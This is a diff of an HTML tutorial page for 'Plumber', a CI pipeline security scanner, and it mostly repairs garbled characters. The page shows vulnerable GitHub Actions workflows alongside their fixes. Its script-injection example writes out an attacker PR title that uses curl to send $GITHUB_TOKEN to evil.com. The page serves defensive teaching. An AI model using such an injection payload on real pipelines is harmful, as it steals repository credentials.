@@ -9,7 +9,7 @@
   <link rel="canonical" href="https://rawweights.com/usecase/plumber-lab.html">
   <meta property="og:type" content="article">
   <meta property="og:url" content="https://rawweights.com/usecase/plumber-lab.html">
-  <meta property="og:title" content="Plumber Lab � Pipeline Security, Visualized">
+  <meta property="og:title" content="Plumber Lab — Pipeline Security, Visualized">
   <meta property="og:description" content="No prior knowledge needed. See your CI pipeline the way an attacker does.">
   <meta property="og:image" content="https://rawweights.com/images/plumber-lab.png">
 
@@ -202,7 +202,7 @@
 <div id="rw-nav"></div>
 <script src="../includes/rw-nav.js?v=20261031"></script>
 
-<!-- -- Hero ---------------------------------------------------- -->
+<!-- ── Hero ──────────────────────────────────────────────────── -->
 <div class="guide-hero">
   <div class="hero-split">
     <div class="hero-text">
@@ -231,7 +231,7 @@
   </div>
 </div>
 
-<!-- -- Guide Content ------------------------------------------- -->
+<!-- ── Guide Content ─────────────────────────────────────────── -->
 <div class="guide-layout">
   <aside class="guide-sidebar">
     <div class="guide-toc-label">Lab Sections</div>
@@ -259,10 +259,10 @@
 
   <main>
 
-    <!-- -- 1. START HERE ------------------------------ -->
+    <!-- ══ 1. START HERE ══════════════════════════════ -->
     <section class="guide-section" id="start">
       <h2>Start Here</h2>
-      <div class="section-sub">Install ? Scan ? Fix ? Gate. No account needed.</div>
+      <div class="section-sub">Install → Scan → Fix → Gate. No account needed.</div>
 
       <p>Run plumber on any repo that has GitHub Actions or GitLab CI workflows. You get a letter score (A&ndash;E), a list of what&rsquo;s wrong, and exact instructions on how to fix each item.</p>
 
@@ -279,10 +279,10 @@
       </button>
       <div class="workflow-starter" id="wf-starter">
         <div class="ann info-ann" style="margin-bottom:.85rem;">
-          <span class="ann-icon">??</span>
-          <div class="ann-body"><strong>What is a workflow file?</strong> A workflow file is a YAML file inside <code>.github/workflows/</code> in your repo. It tells GitHub when to run automated tasks � tests, builds, deployments. If you have no workflows yet, copy one of these to get started, then run plumber on it.</div>
+          <span class="ann-icon">💡</span>
+          <div class="ann-body"><strong>What is a workflow file?</strong> A workflow file is a YAML file inside <code>.github/workflows/</code> in your repo. It tells GitHub when to run automated tasks — tests, builds, deployments. If you have no workflows yet, copy one of these to get started, then run plumber on it.</div>
         </div>
-        <div style="margin-bottom:.75rem;font-family:var(--rw-font-display);font-size:.82rem;font-weight:700;color:var(--rw-text);">Minimal starter � CI with tests</div>
+        <div style="margin-bottom:.75rem;font-family:var(--rw-font-display);font-size:.82rem;font-weight:700;color:var(--rw-text);">Minimal starter — CI with tests</div>
         <div class="code-block" style="margin-bottom:1rem;">
           <div class="code-block-header"><span class="cb-title">.github/workflows/ci.yml</span> <span class="badge-ok">A-score ready</span></div>
           <pre><span class="hl-cmt"># Copy this into .github/workflows/ci.yml</span>
@@ -295,7 +295,7 @@
     branches: [main]
 
 <span class="hl-key">permissions</span>:
-  contents: read        <span class="hl-cmt"># least privilege � required by plumber</span>
+  contents: read        <span class="hl-cmt"># least privilege — required by plumber</span>
 
 <span class="hl-key">jobs</span>:
   test:
@@ -310,7 +310,7 @@
         <div style="margin-bottom:.75rem;font-family:var(--rw-font-display);font-size:.82rem;font-weight:700;color:var(--rw-text);">Weekly dependency audit</div>
         <div class="code-block">
           <div class="code-block-header"><span class="cb-title">.github/workflows/audit.yml</span> <span class="badge-ok">A-score ready</span></div>
-          <pre><span class="hl-cmt"># Runs every Monday � checks for vulnerable packages</span>
+          <pre><span class="hl-cmt"># Runs every Monday — checks for vulnerable packages</span>
 <span class="hl-key">name</span>: Security Audit
 
 <span class="hl-key">on</span>:
@@ -398,7 +398,7 @@ scoop install plumber</div>
         <div class="start-step">
           <div class="step-head">
             <div class="step-num-box">3</div>
-            <div><div class="step-title">Add the security gate to CI</div><div class="step-desc">Same step as Linux � paste into your GitHub Actions workflow YAML.</div></div>
+            <div><div class="step-title">Add the security gate to CI</div><div class="step-desc">Same step as Linux — paste into your GitHub Actions workflow YAML.</div></div>
           </div>
           <div class="step-code-wrap">
             <div class="step-code" id="w3">- name: Plumber security gate
@@ -411,12 +411,12 @@ scoop install plumber</div>
       </div>
 
       <div class="ann ok-ann" style="margin-top:1.25rem;">
-        <span class="ann-icon">?</span>
+        <span class="ann-icon">✅</span>
         <div class="ann-body"><strong>Real result:</strong> A Next.js project with no CI workflows started at Score E, 30/100 after adding two basic workflow files. Two fixes &mdash; <code>persist-credentials: false</code> and branch protection &mdash; brought it to <span style="color:#4ade80;font-weight:700;">Score A, 100/100</span> in under 10 minutes.</div>
       </div>
     </section>
 
-    <!-- -- 2. THE ANALOGY ----------------------------- -->
+    <!-- ══ 2. THE ANALOGY ═════════════════════════════ -->
     <section class="guide-section" id="analogy">
       <h2>The Analogy</h2>
       <div class="section-sub">Pick the one that clicks. They all describe the same tool.</div>
@@ -425,17 +425,17 @@ scoop install plumber</div>
 
       <div class="analogy-cards">
         <div class="analogy-card active" id="ac-bouncer" onclick="showAnalogy('bouncer',this)">
-          <div class="analogy-card-emoji">??</div>
+          <div class="analogy-card-emoji">🚪</div>
           <div class="analogy-card-title">The Bouncer</div>
           <div class="analogy-card-hook">Has a rulebook. Nothing gets in that breaks the rules.</div>
         </div>
         <div class="analogy-card" id="ac-playbook" onclick="showAnalogy('playbook',this)">
-          <div class="analogy-card-emoji">??</div>
+          <div class="analogy-card-emoji">📋</div>
           <div class="analogy-card-title">The Playbook</div>
           <div class="analogy-card-hook">Everyone on the team follows the same rules, automatically.</div>
         </div>
         <div class="analogy-card" id="ac-spellcheck" onclick="showAnalogy('spellcheck',this)">
-          <div class="analogy-card-emoji">??</div>
+          <div class="analogy-card-emoji">✍️</div>
           <div class="analogy-card-title">Spell Check</div>
           <div class="analogy-card-hook">Catches mistakes as they happen, not after the damage is done.</div>
         </div>
@@ -449,7 +449,7 @@ scoop install plumber</div>
             <div class="analogy-row"><span class="analogy-dot"></span>A bouncer stands at the door with a rulebook</div>
             <div class="analogy-row"><span class="analogy-dot"></span>Fake ID? You&rsquo;re not getting in</div>
             <div class="analogy-row"><span class="analogy-dot"></span>Under age? Rejected, no matter who you are</div>
-            <div class="analogy-row"><span class="analogy-dot"></span>The bouncer doesn&rsquo;t debate the rule � they enforce it</div>
+            <div class="analogy-row"><span class="analogy-dot"></span>The bouncer doesn&rsquo;t debate the rule — they enforce it</div>
             <div class="analogy-row"><span class="analogy-dot"></span>No bouncer = anyone walks in</div>
           </div>
           <div class="analogy-half analogy-plumb">
@@ -462,7 +462,7 @@ scoop install plumber</div>
           </div>
         </div>
         <div class="ann info-ann" style="margin-top:.85rem;">
-          <span class="ann-icon">??</span>
+          <span class="ann-icon">🔑</span>
           <div class="ann-body"><strong>The key idea:</strong> The bouncer doesn&rsquo;t wait until someone causes trouble inside. They check at the door. Plumber checks before the code ships &mdash; not after a breach is reported.</div>
         </div>
       </div>
@@ -488,7 +488,7 @@ scoop install plumber</div>
           </div>
         </div>
         <div class="ann info-ann" style="margin-top:.85rem;">
-          <span class="ann-icon">??</span>
+          <span class="ann-icon">📋</span>
           <div class="ann-body"><strong>The key idea:</strong> Security rules written down and enforced automatically means nobody has to trust that someone remembered to follow them. The playbook runs itself.</div>
         </div>
       </div>
@@ -514,7 +514,7 @@ scoop install plumber</div>
           </div>
         </div>
         <div class="ann info-ann" style="margin-top:.85rem;">
-          <span class="ann-icon">??</span>
+          <span class="ann-icon">✍️</span>
           <div class="ann-body"><strong>The key idea:</strong> You already use spell check without thinking about it. Pipeline security should work the same way &mdash; automatic, immediate, not a separate process you have to schedule.</div>
         </div>
       </div>
@@ -524,9 +524,9 @@ scoop install plumber</div>
       <div class="code-compare">
         <div>
           <div class="code-block">
-            <div class="code-block-header"><span class="cb-title">ESLint � checks .js files</span></div>
+            <div class="code-block-header"><span class="cb-title">ESLint — checks .js files</span></div>
             <pre><span class="hl-dim">function checkUser(user) {</span>
-<span class="hl-bad">  if (user.age == "18") {  // ? eqeqeq rule</span>
+<span class="hl-bad">  if (user.age == "18") {  // ← eqeqeq rule</span>
 <span class="hl-dim">    return true;</span>
 <span class="hl-dim">  }</span>
 <span class="hl-dim">}</span>
@@ -538,9 +538,9 @@ scoop install plumber</div>
         </div>
         <div>
           <div class="code-block">
-            <div class="code-block-header"><span class="cb-title">Plumber � checks .yml workflow files</span></div>
+            <div class="code-block-header"><span class="cb-title">Plumber — checks .yml workflow files</span></div>
             <pre><span class="hl-dim">steps:</span>
-<span class="hl-bad">  - uses: actions/checkout@v4  # ? unpinned tag</span>
+<span class="hl-bad">  - uses: actions/checkout@v4  # ← unpinned tag</span>
 <span class="hl-dim">    with:</span>
 <span class="hl-dim">      token: $&#123;&#123; secrets.GITHUB_TOKEN &#125;&#125;</span>
 <span class="hl-dim">      # persist-credentials missing = token on disk</span>
@@ -553,7 +553,7 @@ scoop install plumber</div>
       </div>
     </section>
 
-    <!-- -- 3. LIVE PLAYGROUND ------------------------ -->
+    <!-- ══ 3. LIVE PLAYGROUND ════════════════════════ -->
     <section class="guide-section" id="playground">
       <h2>Live Playground</h2>
       <div class="section-sub">Pick a vulnerability type. See it caught. See the fix. Watch the score change.</div>
@@ -600,7 +600,7 @@ scoop install plumber</div>
       </div>
     </section>
 
-    <!-- -- 4. HOW RULES WORK ------------------------- -->
+    <!-- ══ 4. HOW RULES WORK ═════════════════════════ -->
     <section class="guide-section" id="rego">
       <h2>How Rules Work</h2>
       <div class="section-sub">Step through the credential-leak check, one line at a time.</div>
@@ -633,7 +633,7 @@ scoop install plumber</div>
       <div class="rego-explain" id="rego-explain"></div>
     </section>
 
-    <!-- -- 5. ARCHITECTURE --------------------------- -->
+    <!-- ══ 5. ARCHITECTURE ═══════════════════════════ -->
     <section class="guide-section" id="architecture">
       <h2>Architecture</h2>
       <div class="section-sub">Click any box to see what it does.</div>
@@ -641,17 +641,17 @@ scoop install plumber</div>
       <p>Plumber is a Go command-line tool. Your YAML goes in one end, a score and findings come out the other. The middle layer &mdash; the NormalizedPipeline &mdash; is the design insight that makes it work on both GitHub Actions and GitLab CI with the same rules.</p>
 
       <div class="arch-flow">
-        <div class="arch-box" onclick="showArch('yaml')"><div class="arch-box-icon">??</div><div class="arch-box-label">YAML Files</div><div class="arch-box-sub">.github/workflows/</div></div>
-        <div class="arch-arrow">?</div>
-        <div class="arch-box" onclick="showArch('parser')"><div class="arch-box-icon">??</div><div class="arch-box-label">Go Parser</div><div class="arch-box-sub">github/ gitlab/</div></div>
-        <div class="arch-arrow">?</div>
-        <div class="arch-box" onclick="showArch('ir')"><div class="arch-box-icon">??</div><div class="arch-box-label">Pipeline IR</div><div class="arch-box-sub">common data shape</div></div>
-        <div class="arch-arrow">?</div>
-        <div class="arch-box" onclick="showArch('opa')"><div class="arch-box-icon">??</div><div class="arch-box-label">OPA Engine</div><div class="arch-box-sub">policy evaluator</div></div>
-        <div class="arch-arrow">?</div>
-        <div class="arch-box" onclick="showArch('rules')"><div class="arch-box-icon">??</div><div class="arch-box-label">Rules</div><div class="arch-box-sub">9 categories</div></div>
-        <div class="arch-arrow">?</div>
-        <div class="arch-box" onclick="showArch('output')"><div class="arch-box-icon">??</div><div class="arch-box-label">Score + Findings</div><div class="arch-box-sub">A�E � SARIF � JSON</div></div>
+        <div class="arch-box" onclick="showArch('yaml')"><div class="arch-box-icon">📄</div><div class="arch-box-label">YAML Files</div><div class="arch-box-sub">.github/workflows/</div></div>
+        <div class="arch-arrow">→</div>
+        <div class="arch-box" onclick="showArch('parser')"><div class="arch-box-icon">🔍</div><div class="arch-box-label">Go Parser</div><div class="arch-box-sub">github/ gitlab/</div></div>
+        <div class="arch-arrow">→</div>
+        <div class="arch-box" onclick="showArch('ir')"><div class="arch-box-icon">🧱</div><div class="arch-box-label">Pipeline IR</div><div class="arch-box-sub">common data shape</div></div>
+        <div class="arch-arrow">→</div>
+        <div class="arch-box" onclick="showArch('opa')"><div class="arch-box-icon">⚖️</div><div class="arch-box-label">OPA Engine</div><div class="arch-box-sub">policy evaluator</div></div>
+        <div class="arch-arrow">→</div>
+        <div class="arch-box" onclick="showArch('rules')"><div class="arch-box-icon">📋</div><div class="arch-box-label">Rules</div><div class="arch-box-sub">9 categories</div></div>
+        <div class="arch-arrow">→</div>
+        <div class="arch-box" onclick="showArch('output')"><div class="arch-box-icon">📊</div><div class="arch-box-label">Score + Findings</div><div class="arch-box-sub">A–E · SARIF · JSON</div></div>
       </div>
 
       <div class="arch-detail" id="arch-detail">
@@ -661,27 +661,27 @@ scoop install plumber</div>
 
       <div class="feature-grid" style="margin-top:2rem;">
         <div class="feature-card">
-          <div class="feature-card-icon">??</div>
+          <div class="feature-card-icon">🔄</div>
           <h4>One Rule, Two Platforms</h4>
           <p>Both GitHub Actions and GitLab CI parse into the same data shape. A rule written once works on both &mdash; no duplication, no platform-specific versions.</p>
         </div>
         <div class="feature-card">
-          <div class="feature-card-icon">??</div>
+          <div class="feature-card-icon">📖</div>
           <h4>Open Rules</h4>
           <p>Every rule is a readable file in the open-source repo. You can see exactly what is being checked and why. No black box.</p>
         </div>
         <div class="feature-card">
-          <div class="feature-card-icon">?</div>
+          <div class="feature-card-icon">⚡</div>
           <h4>Attack-Path Scoring</h4>
           <p>Not every problem is equal. A misconfiguration in a deploy pipeline that publishes to npm is ranked higher than the same issue in a docs build. Scoring reflects actual risk.</p>
         </div>
       </div>
     </section>
 
-    <!-- -- 6. VS OTHERS ------------------------------ -->
+    <!-- ══ 6. VS OTHERS ══════════════════════════════ -->
     <section class="guide-section" id="compare">
       <h2>vs. Other Tools</h2>
-      <div class="section-sub">Filter by what matters to you. ? yes &nbsp; ? partial &nbsp; ? no</div>
+      <div class="section-sub">Filter by what matters to you. ✓ yes &nbsp; ◐ partial &nbsp; ✗ no</div>
 
       <div class="filter-bar">
         <button class="filter-chip active" onclick="filterVendors('all',this)">All</button>
@@ -700,32 +700,32 @@ scoop install plumber</div>
 
 <div id="rw-footer"
      data-linkedin="shassanchi"
-     data-related='[{"label":"TrustLens � AI Vendor Trust Scorer","url":"/usecase/trustlens.html"},{"label":"SentTriage � Email Triage Agent","url":"/usecase/sent-triage.html"},{"label":"BuildBridge AI","url":"/usecase/buildbridge-ai.html"}]'
+     data-related='[{"label":"TrustLens — AI Vendor Trust Scorer","url":"/usecase/trustlens.html"},{"label":"SentTriage — Email Triage Agent","url":"/usecase/sent-triage.html"},{"label":"BuildBridge AI","url":"/usecase/buildbridge-ai.html"}]'
 ></div>
 <script src="../includes/rw-footer.js?v=20261030"></script>
 
 <script>
-// -- Hero terminal -------------------------------------------------------------
+// ── Hero terminal ─────────────────────────────────────────────────────────────
 (function(){
   var lines=[
     {t:'$ plumber scan .',c:'cmd'},{t:'',c:''},
-    {t:'  ? parsing .github/workflows/ci.yml ...',c:'info'},
-    {t:'  ? evaluating 9 risk categories ...',c:'info'},{t:'',c:''},
+    {t:'  → parsing .github/workflows/ci.yml ...',c:'info'},
+    {t:'  → evaluating 9 risk categories ...',c:'info'},{t:'',c:''},
     {t:'  Credential Leak   [LOW]   token written to .git/config',c:'warn'},
     {t:'                    ci.yml line 8',c:'dim'},{t:'',c:''},
     {t:'  Unpinned Action   [MED]   action pinned to mutable tag',c:'bad'},
     {t:'                    ci.yml line 8',c:'dim'},{t:'',c:''},
     {t:'  Missing Perms     [MED]   no permissions block declared',c:'bad'},
     {t:'                    ci.yml line 1',c:'dim'},{t:'',c:''},
-    {t:'  Score: E  30/100  ----------- 3 findings',c:'bad'},{t:'',c:''},
+    {t:'  Score: E  30/100  ─────────── 3 findings',c:'bad'},{t:'',c:''},
     {t:'$ # add persist-credentials: false, pin SHA,',c:'dim'},
     {t:'$ # add permissions: contents: read',c:'dim'},
     {t:'$ plumber scan .',c:'cmd'},{t:'',c:''},
-    {t:'  ? parsing .github/workflows/ci.yml ...',c:'info'},
-    {t:'  ? evaluating 9 risk categories ...',c:'info'},{t:'',c:''},
-    {t:'  ? 22 controls passing',c:'ok'},
-    {t:'  ? No findings',c:'ok'},{t:'',c:''},
-    {t:'  Score: A  100/100  ����������  clean',c:'gem'},
+    {t:'  → parsing .github/workflows/ci.yml ...',c:'info'},
+    {t:'  → evaluating 9 risk categories ...',c:'info'},{t:'',c:''},
+    {t:'  ✓ 22 controls passing',c:'ok'},
+    {t:'  ✓ No findings',c:'ok'},{t:'',c:''},
+    {t:'  Score: A  100/100  ██████████  clean',c:'gem'},
   ];
   var el=document.getElementById('hero-terminal'); if(!el)return;
   var i=0;
@@ -739,7 +739,7 @@ scoop install plumber</div>
   next();
 })();
 
-// -- Workflow starter toggle ---------------------------------------------------
+// ── Workflow starter toggle ───────────────────────────────────────────────────
 function toggleWorkflow(){
   var btn=document.getElementById('wf-toggle');
   var box=document.getElementById('wf-starter');
@@ -747,7 +747,7 @@ function toggleWorkflow(){
   btn.classList.toggle('open',open);
 }
 
-// -- Analogy cards -------------------------------------------------------------
+// ── Analogy cards ─────────────────────────────────────────────────────────────
 function showAnalogy(id,card){
   document.querySelectorAll('.analogy-card').forEach(function(c){c.classList.remove('active');});
   document.querySelectorAll('.analogy-detail').forEach(function(d){d.classList.remove('open');});
@@ -755,7 +755,7 @@ function showAnalogy(id,card){
   document.getElementById('ad-'+id).classList.add('open');
 }
 
-// -- Playground ----------------------------------------------------------------
+// ── Playground ────────────────────────────────────────────────────────────────
 function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
 function renderLines(lines){
   return lines.map(function(l){
@@ -770,10 +770,10 @@ var scenarios={
       {t:'on: [push, pull_request]',c:''},
       {t:'jobs:',c:''},{t:'  build:',c:''},{t:'    runs-on: ubuntu-latest',c:''},
       {t:'    steps:',c:''},
-      {t:'      - uses: actions/checkout@v4  # ? mutable tag',c:'hl-bad'},
+      {t:'      - uses: actions/checkout@v4  # ← mutable tag',c:'hl-bad'},
       {t:'      - run: npm ci && npm test',c:''},
     ],
-    risk:{icon:'??',msg:'<strong>The risk:</strong> <code>@v4</code> is a tag the action owner can move to any commit at any time. If someone compromises the <code>actions/checkout</code> repository and moves the <code>v4</code> tag to a malicious commit, every pipeline using <code>@v4</code> automatically runs the malicious code &mdash; with full access to your secrets.'},
+    risk:{icon:'⚠️',msg:'<strong>The risk:</strong> <code>@v4</code> is a tag the action owner can move to any commit at any time. If someone compromises the <code>actions/checkout</code> repository and moves the <code>v4</code> tag to a malicious commit, every pipeline using <code>@v4</code> automatically runs the malicious code &mdash; with full access to your secrets.'},
     output:[
       {t:'  Unpinned Action  [MEDIUM]',c:'bad'},
       {t:'  actions/checkout pinned to mutable tag @v4',c:'bad'},
@@ -797,13 +797,13 @@ var scenarios={
       {t:'      - uses: actions/checkout@v4',c:''},
       {t:'        with:',c:''},
       {t:'          token: ${{ secrets.GITHUB_TOKEN }}',c:''},
-      {t:'          # persist-credentials defaults to true  ?',c:'hl-bad'},
+      {t:'          # persist-credentials defaults to true  ←',c:'hl-bad'},
       {t:'      - run: npm ci && npm build',c:''},
       {t:'      - uses: actions/upload-artifact@v4',c:''},
       {t:'        with:',c:''},
       {t:'          path: ./dist       # may include .git/ folder',c:'hl-bad'},
     ],
-    risk:{icon:'??',msg:'<strong>The risk:</strong> By default, <code>actions/checkout</code> writes your <code>GITHUB_TOKEN</code> into <code>.git/config</code>. When <code>upload-artifact</code> packages the <code>dist</code> folder, it can include <code>.git/config</code> &mdash; and your live token &mdash; in the artifact. Anyone who can download the artifact can authenticate to your GitHub repo.'},
+    risk:{icon:'🔐',msg:'<strong>The risk:</strong> By default, <code>actions/checkout</code> writes your <code>GITHUB_TOKEN</code> into <code>.git/config</code>. When <code>upload-artifact</code> packages the <code>dist</code> folder, it can include <code>.git/config</code> &mdash; and your live token &mdash; in the artifact. Anyone who can download the artifact can authenticate to your GitHub repo.'},
     output:[
       {t:'  Credential Leak (High)',c:'bad'},
       {t:'  Token persists AND .git packed into artifact',c:'bad'},{t:'',c:''},
@@ -818,18 +818,18 @@ var scenarios={
       {t:'      - uses: actions/checkout@11bd71901b  # SHA',c:'hl-ok'},
       {t:'        with:',c:''},
       {t:'          token: ${{ secrets.GITHUB_TOKEN }}',c:''},
-      {t:'          persist-credentials: false  # ? token not saved',c:'hl-ok'},
+      {t:'          persist-credentials: false  # ✓ token not saved',c:'hl-ok'},
       {t:'      - run: npm ci && npm build',c:''},
       {t:'      - uses: actions/upload-artifact@v4',c:''},
       {t:'        with:',c:''},
-      {t:'          path: ./dist/assets  # ? specific subfolder, no .git/',c:'hl-ok'},
+      {t:'          path: ./dist/assets  # ✓ specific subfolder, no .git/',c:'hl-ok'},
     ],
   },
   s3:{
     title:'deploy.yml', badge:'Dangerous Trigger', badgeCls:'badge-bad',
     yaml:[
       {t:'on:',c:''},
-      {t:'  pull_request_target:  # ? fires with base-repo secrets',c:'hl-bad'},
+      {t:'  pull_request_target:  # ← fires with base-repo secrets',c:'hl-bad'},
       {t:'    types: [opened, synchronize]',c:''},
       {t:'jobs:',c:''},{t:'  deploy:',c:''},{t:'    runs-on: ubuntu-latest',c:''},
       {t:'    steps:',c:''},
@@ -838,7 +838,7 @@ var scenarios={
       {t:'          ref: ${{ github.event.pull_request.head.sha }}',c:'hl-bad'},
       {t:'      - run: npm run deploy',c:''},
     ],
-    risk:{icon:'?',msg:'<strong>The risk:</strong> <code>pull_request_target</code> runs in the context of the <em>base</em> repo with access to its secrets &mdash; even for PRs from external forks. By checking out the fork\'s code, you run attacker-controlled code with your own secrets. This is the exact pattern behind the March 2025 tj-actions supply-chain attack (CVE-2025-30066).'},
+    risk:{icon:'⚡',msg:'<strong>The risk:</strong> <code>pull_request_target</code> runs in the context of the <em>base</em> repo with access to its secrets &mdash; even for PRs from external forks. By checking out the fork\'s code, you run attacker-controlled code with your own secrets. This is the exact pattern behind the March 2025 tj-actions supply-chain attack (CVE-2025-30066).'},
     output:[
       {t:'  Dangerous Trigger  [CRITICAL]',c:'bad'},
       {t:'  pull_request_target + fork head checkout',c:'bad'},
@@ -850,7 +850,7 @@ var scenarios={
     ],
     fix:[
       {t:'on:',c:''},
-      {t:'  pull_request:           # ? safe � no base-repo secrets',c:'hl-ok'},
+      {t:'  pull_request:           # ✓ safe — no base-repo secrets',c:'hl-ok'},
       {t:'    types: [opened, synchronize]',c:''},
       {t:'jobs:',c:''},{t:'  test:',c:''},
       {t:'    runs-on: ubuntu-latest',c:''},
@@ -864,14 +864,14 @@ var scenarios={
   s4:{
     title:'pr-check.yml', badge:'Script Injection', badgeCls:'badge-bad',
     yaml:[
-      {t:'on: pull_request_target   # ? privileged trigger',c:'hl-bad'},
+      {t:'on: pull_request_target   # ← privileged trigger',c:'hl-bad'},
       {t:'jobs:',c:''},{t:'  notify:',c:''},{t:'    runs-on: ubuntu-latest',c:''},
       {t:'    steps:',c:''},
       {t:'      - run: |',c:''},
       {t:'          echo "PR: ${{ github.event.pull_request.title }}"',c:'hl-bad'},
       {t:"          # attacker's PR title: \"; curl evil.com?t=$TOKEN\"",c:'hl-bad'},
     ],
-    risk:{icon:'??',msg:'<strong>The risk:</strong> The PR title is set by the person opening the PR &mdash; anyone, including an attacker. When it is pasted directly into a shell command with <code>${{ }}</code>, the shell executes it as code. An attacker opens a PR titled <code>"; curl https://evil.com/steal?t=$GITHUB_TOKEN #</code> and your pipeline sends your token to them.'},
+    risk:{icon:'💉',msg:'<strong>The risk:</strong> The PR title is set by the person opening the PR &mdash; anyone, including an attacker. When it is pasted directly into a shell command with <code>${{ }}</code>, the shell executes it as code. An attacker opens a PR titled <code>"; curl https://evil.com/steal?t=$GITHUB_TOKEN #</code> and your pipeline sends your token to them.'},
     output:[
       {t:'  Script Injection  [CRITICAL]',c:'bad'},
       {t:'  PR title injected directly into shell run: step',c:'bad'},{t:'',c:''},
@@ -882,11 +882,11 @@ var scenarios={
       {t:'  Score: E  5/100',c:'bad'},
     ],
     fix:[
-      {t:'on: pull_request   # ? use safe trigger',c:'hl-ok'},
+      {t:'on: pull_request   # ✓ use safe trigger',c:'hl-ok'},
       {t:'jobs:',c:''},{t:'  notify:',c:''},{t:'    runs-on: ubuntu-latest',c:''},
       {t:'    steps:',c:''},
       {t:'      - run: |',c:''},
-      {t:'          echo "PR: $TITLE"    # ? env var, shell-quoted',c:'hl-ok'},
+      {t:'          echo "PR: $TITLE"    # ✓ env var, shell-quoted',c:'hl-ok'},
       {t:'        env:',c:'hl-ok'},
       {t:'          TITLE: ${{ github.event.pull_request.title }}',c:'hl-ok'},
     ],
@@ -911,7 +911,7 @@ function loadScenario(id,btn){
 function showFix(){document.getElementById('pg-fix-wrap').classList.add('open');}
 loadScenario('s1',document.querySelector('.sc-btn'));
 
-// -- Rego visualizer -----------------------------------------------------------
+// ── Rego visualizer ───────────────────────────────────────────────────────────
 var regoSteps=[
   {
     rule:[
@@ -929,7 +929,7 @@ var regoSteps=[
       {t:'      { "name": "build",',c:''},{t:'        "steps": [...] }',c:''},
       {t:'    ]',c:''},{t:'  }',c:''},{t:'}',c:''},
     ],
-    explain:'<strong>Step 1 of 5 � Your YAML is parsed into structured data.</strong><br><br>Plumber reads <code>ci.yml</code> and converts it into a Go data object called <code>NormalizedPipeline</code>. This is serialised to JSON and becomes <code>input.pipeline</code> &mdash; the data every rule reads. Think of it as plumber transcribing the YAML into a format the rules engine can interrogate.'
+    explain:'<strong>Step 1 of 5 — Your YAML is parsed into structured data.</strong><br><br>Plumber reads <code>ci.yml</code> and converts it into a Go data object called <code>NormalizedPipeline</code>. This is serialised to JSON and becomes <code>input.pipeline</code> &mdash; the data every rule reads. Think of it as plumber transcribing the YAML into a format the rules engine can interrogate.'
   },
   {
     rule:[
@@ -948,7 +948,7 @@ var regoSteps=[
       {t:'        "steps": [...]',c:'rego-active-line'},{t:'      }',c:'rego-active-line'},
       {t:'    ]',c:''},{t:'  }',c:''},{t:'}',c:''},
     ],
-    explain:'<strong>Step 2 of 5 � The rule tries every job.</strong><br><br>OPA works like this: <code>some i</code> means &ldquo;try all possible values of i.&rdquo; For each value, <code>job := input.pipeline.jobs[i]</code> binds that job to a variable. OPA tries every job in your pipeline until it finds one where all the conditions are true &mdash; or finds none and emits no finding.'
+    explain:'<strong>Step 2 of 5 — The rule tries every job.</strong><br><br>OPA works like this: <code>some i</code> means &ldquo;try all possible values of i.&rdquo; For each value, <code>job := input.pipeline.jobs[i]</code> binds that job to a variable. OPA tries every job in your pipeline until it finds one where all the conditions are true &mdash; or finds none and emits no finding.'
   },
   {
     rule:[
@@ -970,7 +970,7 @@ var regoSteps=[
       {t:'      "token": "***"',c:''},
       {t:'    }',c:''},{t:'  }',c:''},{t:']',c:''},
     ],
-    explain:'<strong>Step 3 of 5 � Found the checkout step.</strong><br><br>Now iterating over the steps in the job. <code>contains(step.uses, "actions/checkout")</code> checks whether the step uses the checkout action. It found one. The rule now moves to the next condition with this step bound. The bouncer has found someone who matches the first rule check &mdash; now checking the second.'
+    explain:'<strong>Step 3 of 5 — Found the checkout step.</strong><br><br>Now iterating over the steps in the job. <code>contains(step.uses, "actions/checkout")</code> checks whether the step uses the checkout action. It found one. The rule now moves to the next condition with this step bound. The bouncer has found someone who matches the first rule check &mdash; now checking the second.'
   },
   {
     rule:[
@@ -991,7 +991,7 @@ var regoSteps=[
       {t:'  // that is the checkout action\'s default.',c:'rego-active-line'},
       {t:'}',c:''},
     ],
-    explain:'<strong>Step 4 of 5 � persistCredentials is true.</strong><br><br>The Go parser sets <code>persistCredentials</code> to <code>true</code> when it is absent from your YAML &mdash; because that is what the checkout action defaults to. The condition <code>step.with.persistCredentials == true</code> is met. The rule has now found a job where all conditions are satisfied.'
+    explain:'<strong>Step 4 of 5 — persistCredentials is true.</strong><br><br>The Go parser sets <code>persistCredentials</code> to <code>true</code> when it is absent from your YAML &mdash; because that is what the checkout action defaults to. The condition <code>step.with.persistCredentials == true</code> is met. The rule has now found a job where all conditions are satisfied.'
   },
   {
     rule:[
@@ -1011,7 +1011,7 @@ var regoSteps=[
       {t:'  "fix": "add persist-credentials: false",',c:'rego-active-line'},
       {t:'  "location": "ci.yml:8"',c:'rego-active-line'},{t:'}',c:''},
     ],
-    explain:'<strong>Step 5 of 5 � Finding emitted.</strong><br><br>All conditions passed. OPA adds the finding to the result set. Plumber collects findings from all rules across all 9 risk categories, calculates the score, and prints the report. The fix: add <code>persist-credentials: false</code> to the checkout step. One line. The rule finds nothing next time.'
+    explain:'<strong>Step 5 of 5 — Finding emitted.</strong><br><br>All conditions passed. OPA adds the finding to the result set. Plumber collects findings from all rules across all 9 risk categories, calculates the score, and prints the report. The fix: add <code>persist-credentials: false</code> to the checkout step. One line. The rule finds nothing next time.'
   }
 ];
 var regoIdx=0;
@@ -1026,14 +1026,14 @@ function renderRego(){
 function regoStep(dir){regoIdx=Math.max(0,Math.min(regoSteps.length-1,regoIdx+dir));renderRego();}
 renderRego();
 
-// -- Architecture --------------------------------------------------------------
+// ── Architecture ──────────────────────────────────────────────────────────────
 var archData={
-  yaml:{icon:'??',title:'Your Workflow Files',body:'The raw YAML files in <code>.github/workflows/</code> (GitHub Actions) or <code>.gitlab-ci.yml</code> (GitLab CI). Plumber reads these directly &mdash; no CI run required, works offline and in pre-commit hooks.',files:'Input: .github/workflows/*.yml or .gitlab-ci.yml'},
-  parser:{icon:'??',title:'Go Parser',body:'Provider-specific parsers convert YAML into typed Go structs. The GitHub parser understands Actions syntax. The GitLab parser understands GitLab CI syntax including includes, rules, and variables. Each parser resolves defaults so rules see a complete picture.',files:'Files: github/github_workflows.go, gitlab/gitlab_ci.go'},
-  ir:{icon:'??',title:'NormalizedPipeline (the key insight)',body:'Both parsers write into a common data shape &mdash; one struct that represents any pipeline, regardless of platform. This is what makes plumber unique: write a rule once and it works on both GitHub Actions and GitLab CI without modification.',files:'Files: internal/ir/pipeline.go'},
